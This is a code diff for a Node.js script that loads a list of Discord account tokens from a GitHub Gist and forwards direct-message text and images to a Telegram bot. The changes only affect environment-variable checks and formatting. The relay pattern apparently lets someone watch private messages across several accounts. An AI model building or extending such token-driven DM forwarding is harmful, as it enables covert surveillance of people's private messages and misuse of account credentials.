@@ -32,8 +32,19 @@ const TELEGRAM_BOT_TOKEN = (process.env.TELEGRAM_BOT_TOKEN || config.TELEGRAM_BO
 const TELEGRAM_CHAT_ID = (process.env.TELEGRAM_CHAT_ID || config.TELEGRAM_CHAT_ID || '').replace(/[{}]/g, '').trim();
 const GIST_TOKENS_URL = (process.env.GIST_TOKENS_URL || config.GIST_TOKENS_URL || '').trim();
 
-if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
-    console.error("Critical Verification Error: Missing clean variables in your .env file or Render Environment tab!");
+// EXACT ERROR IDENTIFIER SYSTEM
+if (!TELEGRAM_BOT_TOKEN) {
+    console.error("❌ Critical Verification Error: 'TELEGRAM_BOT_TOKEN' is missing or blank in Render's Environment tab!");
+    process.exit(1);
+}
+
+if (!TELEGRAM_CHAT_ID) {
+    console.error("❌ Critical Verification Error: 'TELEGRAM_CHAT_ID' is missing or blank in Render's Environment tab!");
+    process.exit(1);
+}
+
+if (!GIST_TOKENS_URL) {
+    console.error("❌ Critical Verification Error: 'GIST_TOKENS_URL' is missing or blank in Render's Environment tab!");
     process.exit(1);
 }
 // ========================================================
@@ -204,23 +215,17 @@ async function handleValidDM(client, message) {
             }
             if (message.attachments.some(att => !att.contentType?.startsWith('image/'))) {
                 await sendToTelegram(text);
-            }
-        } else {
-            await sendToTelegram(text);
-        }
-    } catch (err) {
-        console.error("Error inside handleValidDM router:", err.message);
-    }
 }
-    
+} else {
+await sendToTelegram(text);
+}
+} catch (err) {
+console.error("Error inside handleValidDM router:", err.message);
+}
+}
 // Sequential Execution Loop
 async function bootSequence() {
-    let DISCORD_TOKENS = [];
-
-    if (!GIST_TOKENS_URL) {
-console.error("❌ Error: GIST_TOKENS_URL environment variable is missing!");
-process.exit(1);
-}
+let DISCORD_TOKENS = [];
 try {
 console.log("🌐 Fetching token list from GitHub Gist...");
 const response = await fetch(GIST_TOKENS_URL);
@@ -273,7 +278,7 @@ await sendToTelegram(caption + \n🖼️ Image: ${imageUrl});
 async function sendToTelegram(text) {
 if (!TELEGRAM_CHAT_ID) return;
 try {
-const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+ const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
 const response = await fetch(url, {
 method: 'POST',
 headers: { 'Content-Type': 'application/json' },
